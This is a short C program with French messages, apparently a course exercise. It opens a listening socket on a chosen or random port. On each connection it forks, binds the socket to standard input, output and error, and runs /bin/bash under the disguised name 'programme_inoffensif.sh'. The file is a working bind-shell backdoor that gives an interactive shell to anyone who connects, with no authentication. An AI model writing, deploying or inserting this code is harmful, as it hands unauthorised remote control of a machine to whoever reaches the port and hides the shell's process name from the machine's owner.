#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/wait.h>

#include "utils_v2.h"
#include "network.h"

void startShell(void *arg)
{
  int socketFD = *(int*)arg;
  dup2(socketFD, STDIN_FILENO);
  dup2(socketFD, STDOUT_FILENO);
  dup2(socketFD, STDERR_FILENO);

  sclose(socketFD);
  
  sexecl("/bin/bash", "programme_inoffensif.sh", NULL);
}

int getPort(int nbArg, const char *const tabArg[])
{
  int port;
  if (nbArg > 1)
  {
    port = atoi(tabArg[1]);
  }
  else
  {
    port = tabPorts[randomIntBetween(0, 9)];
  }

  printf("Port choisi aléatoirement : %d\n", port);

  return port;
}

int main(int argc, char const *argv[])
{
  int port = getPort(argc, argv);
  int sockfd = initSocketServer(port);
  while (1)
  {
    printf("Attente de connexion au socket...\n");
    int socketForThisAccept = accept(sockfd, NULL, NULL);
    if (socketForThisAccept == -1)
    {
      printf("Problème accept\n");
      exit(1);
    }
    

    printf("Connexion reçue !\n");
    fork_and_run1(startShell,&socketForThisAccept);
    //startShell(socketForThisAccept);
  }
}